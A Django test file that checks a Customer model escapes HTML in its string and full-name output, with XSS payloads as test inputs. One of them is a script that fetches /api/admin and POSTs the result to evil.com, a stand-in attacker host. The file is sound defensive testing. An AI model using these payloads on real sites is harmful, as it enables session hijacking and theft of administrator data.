"""
Security tests for the Customer model to prevent XSS vulnerabilities.
"""
from django.test import TestCase
from customers.models import Customer


class CustomerModelSecurityTest(TestCase):
    """Test security features of the Customer model."""

    def setUp(self):
        """Set up test data."""
        self.safe_customer_data = {
            "first_name": "John",
            "last_name": "Doe", 
            "email": "john.doe@example.com",
            "phone": "555-1234"
        }

    def test_str_method_sanitizes_xss_in_first_name(self):
        """Test that __str__ method sanitizes XSS in first name."""
        xss_first_name = "<script>alert('XSS')</script>"
        customer_data = self.safe_customer_data.copy()
        customer_data["first_name"] = xss_first_name
        
        customer = Customer.objects.create(**customer_data)
        str_representation = str(customer)
        
        # Should contain escaped HTML entities, not executable script tags
        self.assertIn("&lt;script&gt;", str_representation)
        self.assertIn("&#x27;", str_representation)  # Single quote
        self.assertNotIn("<script>", str_representation)
        self.assertNotIn("alert('XSS')", str_representation)

    def test_str_method_sanitizes_xss_in_last_name(self):
        """Test that __str__ method sanitizes XSS in last name."""
        xss_last_name = '<img src="x" onerror="alert(1)">'
        customer_data = self.safe_customer_data.copy()
        customer_data["last_name"] = xss_last_name
        
        customer = Customer.objects.create(**customer_data)
        str_representation = str(customer)
        
        # Should contain escaped HTML entities
        self.assertIn("&lt;img", str_representation)
        self.assertIn("&quot;", str_representation)  # Double quote
        self.assertNotIn("<img", str_representation)
        self.assertNotIn('onerror="alert(1)"', str_representation)

    def test_str_method_sanitizes_xss_in_email(self):
        """Test that __str__ method sanitizes XSS in email."""
        xss_email = 'test@example.com<svg onload="alert(\'XSS\')">'
        customer_data = self.safe_customer_data.copy()
        customer_data["email"] = xss_email
        
        customer = Customer.objects.create(**customer_data)
        str_representation = str(customer)
        
        # Should contain escaped HTML entities
        self.assertIn("&lt;svg", str_representation)
        self.assertIn("&#x27;", str_representation)  # Single quote
        self.assertNotIn("<svg", str_representation)
        self.assertNotIn("onload=", str_representation)

    def test_full_name_property_sanitizes_xss_in_first_name(self):
        """Test that full_name property sanitizes XSS in first name."""
        xss_first_name = "<script>document.location='http://evil.com'</script>"
        customer_data = self.safe_customer_data.copy()
        customer_data["first_name"] = xss_first_name
        
        customer = Customer.objects.create(**customer_data)
        full_name = customer.full_name
        
        # Should contain escaped HTML entities
        self.assertIn("&lt;script&gt;", full_name)
        self.assertIn("&#x27;", full_name)  # Single quote
        self.assertNotIn("<script>", full_name)
        self.assertNotIn("document.location=", full_name)

    def test_full_name_property_sanitizes_xss_in_last_name(self):
        """Test that full_name property sanitizes XSS in last name."""
        xss_last_name = "Doe<iframe src='javascript:alert(1)'></iframe>"
        customer_data = self.safe_customer_data.copy()
        customer_data["last_name"] = xss_last_name
        
        customer = Customer.objects.create(**customer_data)
        full_name = customer.full_name
        
        # Should contain escaped HTML entities
        self.assertIn("&lt;iframe", full_name)
        self.assertIn("&#x27;", full_name)  # Single quote
        self.assertNotIn("<iframe", full_name)
        self.assertNotIn("javascript:alert(1)", full_name)

    def test_complex_xss_payload_sanitization(self):
        """Test sanitization of complex XSS payloads."""
        complex_xss = '''<script>fetch('/api/admin').then(r=>r.text()).then(t=>fetch('http://evil.com',{method:'POST',body:t}))</script>'''
        customer_data = self.safe_customer_data.copy()
        customer_data["first_name"] = complex_xss
        
        customer = Customer.objects.create(**customer_data)
        str_representation = str(customer)
        full_name = customer.full_name
        
        # Should be properly escaped in both methods
        for representation in [str_representation, full_name]:
            self.assertIn("&lt;script&gt;", representation)
            self.assertIn("&#x2F;", representation)  # Forward slash
            self.assertIn("&#x27;", representation)  # Single quote
            self.assertNotIn("<script>", representation)
            self.assertNotIn("fetch('/api/admin')", representation)
            self.assertNotIn("evil.com", representation)  # This might be escaped

    def test_safe_content_not_over_sanitized(self):
        """Test that normal content is not over-sanitized."""
        safe_customer = Customer.objects.create(**self.safe_customer_data)
        
        # Normal content should appear normally
        expected_str = f"John Doe ({self.safe_customer_data['email']})"
        expected_full_name = "John Doe"
        
        self.assertEqual(str(safe_customer), expected_str)
        self.assertEqual(safe_customer.full_name, expected_full_name)

    def test_ampersand_and_special_chars_handling(self):
        """Test proper handling of ampersands and special characters."""
        customer_data = self.safe_customer_data.copy()
        customer_data["first_name"] = "John & Jane"
        customer_data["last_name"] = "O'Connor"
        
        customer = Customer.objects.create(**customer_data)
        str_representation = str(customer)
        full_name = customer.full_name
        
        # Ampersands should be escaped
        self.assertIn("&amp;", str_representation)
        self.assertIn("&amp;", full_name)
        
        # Single quotes should be escaped
        self.assertIn("&#x27;", str_representation)
        self.assertIn("&#x27;", full_name)
        
        # Should not contain raw ampersands or quotes in dangerous contexts
        self.assertNotIn(" & ", str_representation)
        self.assertNotIn("'", str_representation)

    def test_empty_and_none_values(self):
        """Test handling of empty and None values."""
        customer_data = self.safe_customer_data.copy()
        customer_data["first_name"] = ""
        customer_data["last_name"] = ""
        
        customer = Customer.objects.create(**customer_data)
        
        # Should handle empty values gracefully
        str_representation = str(customer)
        full_name = customer.full_name
        
        # Should not raise exceptions
        self.assertIsInstance(str_representation, str)
        self.assertIsInstance(full_name, str)
        
        # Should contain email even with empty names
        self.assertIn(customer.email, str_representation)